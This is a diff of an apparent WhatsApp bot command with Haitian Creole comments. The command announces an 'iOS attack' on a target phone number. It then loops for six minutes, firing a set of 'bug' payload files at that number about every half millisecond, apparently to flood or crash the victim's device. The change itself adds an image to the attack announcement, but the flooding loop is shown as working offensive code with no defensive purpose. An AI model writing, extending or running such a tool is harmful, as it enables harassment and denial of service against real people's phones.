@@ -44,11 +44,16 @@ cmd({
       }, { quoted: mek });
     }
 
+    // ✅ VOYE FOTO 3.png AVAN ATAK LA
+    const imagePath = path.join(__dirname, '../media/3.png');
+    const imageBuffer = fs.readFileSync(imagePath);
     await bot.sendMessage(from, {
-      text: `🧨 𝐉𝐄𝐒𝐔𝐒-𝐈𝐎𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃\n🔗 wa.me/${targetNumber}\n🍎 Target: iOS suspected\n🕒 Duration: 6min\n💥 Delay: 0.0005s\n📦 Payloads: ${bugFiles.length}`,
+      image: imageBuffer,
+      caption: `🧨 𝐉𝐄𝐒𝐔𝐒-𝐈𝐎𝐒 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃\n🔗 wa.me/${targetNumber}\n🍎 Target: iOS suspected\n🕒 Duration: 6min\n💥 Delay: 0.0005s\n📦 Payloads: ${bugFiles.length}`,
     }, { quoted: mek });
 
-    const endTime = Date.now() + (6 * 60 * 1000); // 6 minutes
+    // ✅ KÒMANSE ATAK LA
+    const endTime = Date.now() + (6 * 60 * 1000); // 6 minit
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
@@ -78,7 +83,7 @@ cmd({
           console.error(`❌ Error in ${file}:`, e.message);
         }
 
-        await new Promise(res => setTimeout(res, 0.5)); // 0.0005s = 0.5ms
+        await new Promise(res => setTimeout(res, 0.5)); // Delay 0.5ms
       }
     }
 
